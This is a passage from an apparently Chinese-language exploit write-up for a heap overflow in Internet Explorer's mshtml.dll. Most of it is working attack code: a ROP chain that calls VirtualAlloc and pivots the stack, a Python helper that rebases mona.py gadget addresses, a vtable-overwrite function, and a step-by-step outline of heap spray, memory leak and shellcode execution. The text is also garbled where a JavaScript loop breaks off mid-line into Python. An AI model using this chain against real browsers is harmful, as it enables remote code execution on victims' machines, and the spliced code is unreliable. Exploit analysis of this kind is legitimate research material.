                    var heapobj = new Object();
                    // generated with mona.py (mshtml.dll v)
                        function rop_chain(mshtmlbase)
                        {
                            var arr = [
                            mshtmlbase + Number(0x00001031),
                            mshtmlbase + Number(0x00002c78),    // pop ebp; retn
                            mshtmlbase + Number(0x0001b4e3),    // xchg eax,esp; retn (pivot)
                            mshtmlbase + Number(0x00352c8b),    // pop eax; retn
                            mshtmlbase + Number(0x00001340),    // ptr to &VirtualAlloc() [IAT]
                            mshtmlbase + Number(0x00124ade),    // mov eax,[eax]; retn
                            mshtmlbase + Number(0x000af93e),    // xchg eax,esi; and al,0; xor eax,eax; retn
                            mshtmlbase + Number(0x00455a9c),    // pop ebp; retn
                            mshtmlbase + Number(0x00128b8d),    // & jmp esp
                            mshtmlbase + Number(0x00061436),    // pop ebx; retn
                            0x00000001,                       // 0x00000001-> ebx
                            mshtmlbase + Number(0x0052d8a3),    // pop edx; retn
                            0x00001000,                       // 0x00001000-> edx
                            mshtmlbase + Number(0x00003670),    // pop ecx; retn
                            0x00000040,                       // 0x00000040-> ecx
                            mshtmlbase + Number(0x001d263d),    // pop edi; retn
                            mshtmlbase + Number(0x000032ac),    // retn
                            mshtmlbase + Number(0x00352c9f),    // pop eax; retn
                            0x90909090,                       // nop
                            mshtmlbase + Number(0x0052e805),    // pushad; retn
                            0x90909090,
                            0x90909090,
                            0x90909090,
                            0x90909090,
                            0x90909090,
                                ];
                            return arr;
                            }
                    function d2u(dword)
                    {
                        var uni = String.fromCharCode(dword & 0xFFFF);
                        uni += String.fromCharCode(dword>>16);
                        return uni;
                    }
                    function tab2uni(heapobj, tab)
                    {
                        var uni = ""
                        for(var i=0;i0 and num_hex!=2425393296:    #0x90909090
                    DestFile.write('    '+hex(rva)+'\n')
                else:
                    DestFile.write('    '+hex(num_hex)+'\n')
        SrcFile.close()
        DestFile.close()
    if __name__ == '__main__':
        parser=argparse.ArgumentParser()
        parser.add_argument('-s',help='SrcFile')
        parser.add_argument('-d',help='DestFile')
        parser.add_argument('-b',type=int,help='ModuleBaseAddr')
        args=parser.parse_args()
        if args.s and args.d and args.b:
            GenRelAddr(args.s,args.d,args.b)
        else:
            print("Please enter the correct parameters.")
方法为`-s 1.txt -d 2.txt -b 1666711552`，其中`1.txt`内容如下：
    rop_gadgets = [
          #[---INFO:gadgets_to_set_esi:---]
          0x6371b8f5,  # POP ECX # RETN [mshtml.dll] 
          0x63581314,  # ptr to &VirtualAlloc() [IAT mshtml.dll]
          0x6392bf47,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [mshtml.dll] 
          0x63aa9a60,  # XCHG EAX,ESI # RETN [mshtml.dll] 
          #[---INFO:gadgets_to_set_ebp:---]
          0x635ac41c,  # POP EBP # RETN [mshtml.dll] 
          0x635ead14,  # & jmp esp [mshtml.dll]
          #[---INFO:gadgets_to_set_ebx:---]
          0x636895b1,  # POP EBX # RETN [mshtml.dll] 
          0x00000001,  # 0x00000001-> ebx
          #[---INFO:gadgets_to_set_edx:---]
          0x637ccce4,  # POP EDX # RETN [mshtml.dll] 
          0x00001000,  # 0x00001000-> edx
          #[---INFO:gadgets_to_set_ecx:---]
          0x6358e41f,  # POP ECX # RETN [mshtml.dll] 
          0x00000040,  # 0x00000040-> ecx
          #[---INFO:gadgets_to_set_edi:---]
          0x6366cccd,  # POP EDI # RETN [mshtml.dll] 
          0x63900c06,  # RETN (ROP NOP) [mshtml.dll]
          #[---INFO:gadgets_to_set_eax:---]
          0x637f3ee3,  # POP EAX # RETN [mshtml.dll] 
          0x90909090,  # nop
          #[---INFO:pushad:---]
          0x636bfa7c,  # PUSHAD # RETN [mshtml.dll] 
        ]
`1666711552`是笔者环境中`mshtml.dll`基址十进制值。
第二次溢出：
    function smash_vtable()
                {
                        var obj_col_0 = document.getElementById("132");
                        obj_col_0.width = "1178993";                    // smash the vftable 0x07070024
                        obj_col_0.span = "44";                      // the amount to overwrite
                }
写入发生于第28次循环，对应指令为`0x6368CD98`处`mov [esi+8], ebx`，写入前：
写入完成后调用该虚表指针时即可控制执行流。
最后，总结下利用思路：Heap
Spray—>释放内存—>``占位—>堆溢出(更改BSTR长度位)—>”越界读”虚表指针，计算`mshtml.dll`基址—>Heap
Spray(布局ROP+Shellcode)—>堆溢出(更改虚表指针到ROP+Shellcode地址)
## 0x03 参阅链接
  * [HTMLElement.style](https://developer.mozilla.org/zh-CN/docs/Web/API/HTMLElement/style)
  * [display](https://developer.mozilla.org/zh-CN/docs/Web/CSS/display)
  * [Python实现生成相对地址的ROP](https://blog.csdn.net/qq_35519254/article/details/53234599)